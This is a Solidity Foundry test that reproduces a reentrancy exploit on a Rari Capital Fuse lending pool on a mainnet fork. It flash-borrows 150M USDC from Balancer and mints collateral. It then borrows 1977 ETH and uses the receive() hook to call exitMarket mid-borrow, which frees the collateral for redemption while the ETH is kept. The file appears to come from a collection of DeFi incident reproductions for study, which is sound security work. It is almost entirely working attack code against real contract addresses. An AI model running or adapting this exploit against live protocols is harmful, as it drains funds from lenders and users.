// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {

    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    ICEtherDelegate fETH_127 = ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));

    ICErc20Delegate fusdc_127 = ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);

    IUnitroller rari_Comptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_684_813); //fork mainnet at 14684813
    }

    function testExploit() public {
        emit log_named_uint("ETH Balance of fETH_127 before borrowing", address(fETH_127).balance / 1e18);

        payable(address(0)).transfer(address(this).balance);

        emit log_named_uint("ETH Balance after sending to blackHole", address(this).balance);

        address[] memory tokens = new address[](1);

        tokens[0] = address(usdc);

        uint256[] memory amounts = new uint256[](1);

        amounts[0] = 150_000_000 * 10 ** 6;

        vault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        tokens;
        amounts;
        feeAmounts;
        userData;

        uint256 usdc_balance = usdc.balanceOf(address(this));
        emit log_named_uint("Borrow USDC from balancer", usdc_balance);
        usdc.approve(address(fusdc_127), type(uint256).max);

        fusdc_127.accrueInterest();

        fusdc_127.mint(15_000_000_000_000);

        uint256 fETH_Balance = fETH_127.balanceOf(address(this));

        emit log_named_uint("fETH Balance after minting", fETH_Balance);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after minting", usdc_balance);

        address[] memory ctokens = new address[](1);

        ctokens[0] = address(fusdc_127);

        rari_Comptroller.enterMarkets(ctokens);

        fETH_127.borrow(1977 ether);

        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing", address(fETH_127).balance / 1e18);

        emit log_named_uint("ETH Balance of me after borrowing", address(this).balance / 1e18);

        usdc_balance = usdc.balanceOf(address(this));

        fusdc_127.approve(address(fusdc_127), type(uint256).max);

        fusdc_127.redeemUnderlying(15_000_000_000_000);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after borrowing", usdc_balance);

        usdc.transfer(address(vault), usdc_balance);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after repayying", usdc_balance);
    }

    receive() external payable {
        rari_Comptroller.exitMarket(address(fusdc_127));
    }

}
